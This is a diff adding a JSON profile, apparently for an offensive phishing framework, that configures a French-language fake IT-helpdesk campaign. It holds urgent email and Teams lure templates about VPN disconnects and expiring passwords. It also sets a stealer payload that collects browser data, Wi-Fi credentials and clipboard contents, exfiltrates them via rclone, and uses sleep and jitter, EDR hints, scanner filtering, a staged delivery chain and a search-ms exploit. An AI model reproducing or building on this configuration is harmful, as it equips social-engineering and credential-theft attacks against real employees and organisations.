@@ -1,0 +1,44 @@
+{
+  "id": "support",
+  "label": "Support IT — réinitialisation",
+  "persona": {
+    "brand": "Support Informatique",
+    "voice": "helpdesk interne",
+    "urgency": "high",
+    "lexicon": ["ticket", "mot de passe", "helpdesk", "incident"]
+  },
+  "scenarios": ["it_support", "mfa_reset", "vpn_disconnect"],
+  "channels": {
+    "email": {
+      "subject": "[Ticket {ref}] Action utilisateur requise",
+      "body": "{name},\n\nUn ticket a été ouvert sur votre compte ({ref}) : votre session VPN se déconnecte et votre mot de passe expire dans {deadline}.\n\nValidez votre identité pour rétablir l'accès : {lure}\n\n— {agent}, support niveau 2"
+    },
+    "teams": {
+      "body": "{name} — ticket {ref} en attente de votre action. Votre accès sera suspendu dans {deadline} : {lure}"
+    }
+  },
+  "context": {
+    "inject": ["ref", "deadline", "name", "agent"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "terminal", "explorer"],
+    "min_reliability": 4,
+    "prefer_tags": ["stealth", "core"],
+    "avoid": ["winr-certutil"]
+  },
+  "payload": {
+    "kind": "stealer",
+    "collect": ["browser", "wifi", "clipboard"],
+    "exfil": "rclone",
+    "sleep": 30,
+    "jitter": 0.4,
+    "edr_hint": "admin"
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 8,
+    "variant_count": 3
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["search-ms"]
+}
